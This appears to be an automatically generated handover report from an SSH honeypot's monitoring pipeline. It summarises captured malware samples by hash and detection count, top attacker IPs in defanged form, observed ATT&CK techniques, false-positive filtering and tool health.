| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **31/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `124.228.34[.]69` | CN | CHINANET Hunan province network | **100** ⚠️ | 43 |
| `180.76.233[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 15 |
| `186.137.131[.]237` | AR | Telecom Argentina S.A. | **100** ⚠️ | 19 |
| `124.18.182[.]99` | JP | Chubu Telecommunications Co.,Inc. | **100** ⚠️ | 9 |
| `183.91.220[.]148` | KR | Namincheon-broadcasting | **100** ⚠️ | 21 |
| `219.79.56[.]86` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 2 |
| `124.163.255[.]210` | CN | China Unicom Shanxi province network | **100** ⚠️ | 50 |
| `14.103.114[.]234` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `54.37.229[.]48` | FR | OVH SAS | **100** ⚠️ | 41 |
| `66.132.224[.]88` | US | Censys, Inc. | **100** ⚠️ | 30 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 129 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 58 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 58 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 29 |

---

## 🔕 False Positive Summary (349 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 52 |
| AbuseIPDB score 13 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 291 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1427 cases |
| Tool 34  | Credential Extractor        | ✅ 116 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 58 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 349 filtered (24.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 25 recon entry/entries in table (8 group(s) consolidating 1003 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-12T14:33:27Z_
